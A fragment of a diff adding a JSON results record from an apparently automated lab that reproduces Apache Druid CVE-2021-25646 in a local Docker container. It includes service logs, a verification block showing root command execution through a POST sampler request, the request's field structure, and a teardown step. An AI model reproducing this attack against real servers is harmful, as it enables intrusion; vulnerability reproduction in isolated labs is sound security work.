+      "source_path": null
+    }
+  ],
+  "agent_status": "submitted",
+  "logs": {
+    "argv": [
+      "docker",
+      "compose",
+      "--project-name",
+      "lab-druid-local-003",
+      "--file",
+      "F:\\codex-workspace\\VulnForge\\.labs\\lab-druid-local-003\\source\\docker-compose.yml",
+      "logs",
+      "--no-color",
+      "--tail",
+      "100"
+    ],
+    "exit_code": 0,
+    "stdout": "web-1  | [Thu Nov 19 18:58:47 2026] Running command[zk], logging to[/opt/druid/var/sv/zk.log]: bin/run-zk conf\nweb-1  | [Thu Nov 19 18:58:47 2026] Running command[coordinator-overlord], logging to[/opt/druid/var/sv/coordinator-overlord.log]: bin/run-druid coordinator-overlord conf/druid/single-server/nano-quickstart\nweb-1  | [Thu Nov 19 18:58:47 2026] Running command[broker], logging to[/opt/druid/var/sv/broker.log]: bin/run-druid broker conf/druid/single-server/nano-quickstart\nweb-1  | [Thu Nov 19 18:58:47 2026] Running command[router], logging to[/opt/druid/var/sv/router.log]: bin/run-druid router conf/druid/single-server/nano-quickstart\nweb-1  | [Thu Nov 19 18:58:47 2026] Running command[historical], logging to[/opt/druid/var/sv/historical.log]: bin/run-druid historical conf/druid/single-server/nano-quickstart\nweb-1  | [Thu Nov 19 18:58:47 2026] Running command[middleManager], logging to[/opt/druid/var/sv/middleManager.log]: bin/run-druid middleManager conf/druid/single-server/nano-quickstart\n",
+    "stderr": "",
+    "stdout_truncated": false,
+    "stderr_truncated": false
+  },
+  "verification": {
+    "status": "success",
+    "reason": "The POST reproduction request returned an HTTP 200 JSON sampler response whose parsed record contains the OS command output `uid=0(root) gid=0(root) groups=0(root)`, matching the documented command-execution effect. Container logs also show the Druid services running despite the initial health check failure.",
+    "evidence_quotes": [
+      "\"parsed\":{\"__time\":123123,\"test\":\"uid=0(root) gid=0(root) groups=0(root)",
+      "uid=0(root) gid=0(root) groups=0(root)"
+    ],
+    "card": "F:\\codex-workspace\\VulnForge\\knowledge\\apache-druid-CVE-2021-25646.yaml",
+    "file_observations": [],
+    "structure_checks": [
+      {
+        "operation": "action-4",
+        "checks": [
+          {
+            "field": "method",
+            "operator": "equals",
+            "expected": "POST",
+            "observed": "POST",
+            "status": "match"
+          },
+          {
+            "field": "media_type",
+            "operator": "equals",
+            "expected": "application/json",
+            "observed": "application/json",
+            "status": "match"
+          },
+          {
+            "field": "json.type",
+            "operator": "type",
+            "expected": "string",
+            "observed": "string",
+            "status": "match"
+          },
+          {
+            "field": "json.spec",
+            "operator": "type",
+            "expected": "object",
+            "observed": "object",
+            "status": "match"
+          },
+          {
+            "field": "json.samplerConfig",
+            "operator": "type",
+            "expected": "object",
+            "observed": "object",
+            "status": "match"
+          },
+          {
+            "field": "json.field_names",
+            "status": "match"
+          },
+          {
+            "field": "cookie.names",
+            "status": "match"
+          }
+        ],
+        "matched": true
+      }
+    ]
+  },
+  "cleanup_result": {
+    "argv": [
+      "docker",
+      "compose",
+      "--project-name",
+      "lab-druid-local-003",
+      "--file",
+      "F:\\codex-workspace\\VulnForge\\.labs\\lab-druid-local-003\\source\\docker-compose.yml",
+      "down",
+      "--volumes",
+      "--remove-orphans",
+      "--timeout",
+      "10"
+    ],
+    "exit_code": 0,
+    "stdout": "",
+    "stderr": " Container lab-druid-local-003-web-1  Stopping\n Container lab-druid-local-003-web-1  Stopped\n Container lab-druid-local-003-web-1  Removing\n Container lab-druid-local-003-web-1  Removed\n Network lab-druid-local-003_default  Removing\n Network lab-druid-local-003_default  Removed\n",
+    "stdout_truncated": false,
+    "stderr_truncated": false
+  }
+}
